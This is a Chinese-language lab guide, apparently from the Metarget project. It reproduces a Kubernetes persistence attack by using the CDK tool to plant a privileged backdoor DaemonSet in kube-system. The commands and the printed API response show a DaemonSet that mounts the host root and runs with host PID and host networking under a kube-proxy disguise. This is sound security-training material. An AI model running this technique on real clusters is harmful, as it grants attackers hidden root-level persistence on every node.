# 部署K8s后门Daemonset

## 场景介绍

Daemonset是K8s集群的一种资源，可在集群内的每个节点上部署Pod。

在集群内获取到一定的权限，需要对当前的权限进行持久化控制时，可利用K8s Daemonset资源的特性，创建一个kube-system命名空间下的Daemonset资源，进行持久化控制。

## 环境搭建

基础环境（Docker+K8s）准备（如果已经有任意版本的Docker+K8s环境则可跳过）：

```bash
./metarget gadget install docker --version 18.03.1
./metarget gadget install k8s --version 1.16.5 --domestic
```

漏洞环境准备：

```bash
./metarget cnv install k8s_backdoor_daemonset
```

执行完成后，K8s集群内`metarget`命令空间下将会创建一个名为`k8s-backdoor-daemonset`的pod。

## 漏洞复现

下载漏洞利用工具[CDK](https://github.com/cdk-team/CDK)，将其传入`k8s-backdoor-daemonset`pod中：

```
sudo kubectl cp cdk k8s-backdoor-daemonset:/ -n metarget
```

执行以下命令运行工具（该命令会在kubs-system空间下创建一个daemonset资源）：

```
sudo kubectl exec -it k8s-backdoor-daemonset /cdk run k8s-backdoor-daemonset default ubuntu "date > /tmp/flag ; sleep 10000"
```

查看执行结果包含以下字段则部署成功，也可通过运行`sudo kubectl get ds -n kube-sytem | grep cdk` 验证部署结果。

```
api-server response:
{"kind":"DaemonSet","apiVersion":"apps/v1","metadata":{"name":"cdk-backdoor-daemonset","namespace":"kube-system","selfLink":"/apis/apps/v1/namespaces/kube-system/daemonsets/cdk-backdoor-daemonset","uid":"78954f17-ef44-4e1f-9de3-d0703116ac87","resourceVersion":"4504","generation":1,"creationTimestamp":"2022-08-26T09:53:38Z","labels":{"k8s-app":"kube-proxy"},"annotations":{"deprecated.daemonset.template.generation":"1"}},"spec":{"selector":{"matchLabels":{"k8s-app":"kube-proxy"}},"template":{"metadata":{"creationTimestamp":null,"labels":{"k8s-app":"kube-proxy"}},"spec":{"volumes":[{"name":"host-volume","hostPath":{"path":"/","type":""}}],"containers":[{"name":"cdk-backdoor-pod","image":"ubuntu","args":["/bin/sh","-c","date \u003e /tmp/flag ; sleep 10000"],"resources":{},"volumeMounts":[{"name":"host-volume","mountPath":"/host-root"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"capabilities":{"add":["NET_ADMIN","SYS_ADMIN","SYS_PTRACE","AUDIT_CONTROL","MKNOD","SETFCAP"]},"privileged":true}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","hostNetwork":true,"hostPID":true,"securityContext":{},"schedulerName":"default-scheduler"}},"updateStrategy":{"type":"RollingUpdate","rollingUpdate":{"maxUnavailable":1}},"revisionHistoryLimit":10},"status":{"currentNumberScheduled":0,"numberMisscheduled":0,"desiredNumberScheduled":0,"numberReady":0}}
```

注：复现后请及时清除相关资源。

## 参考文献

1. https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset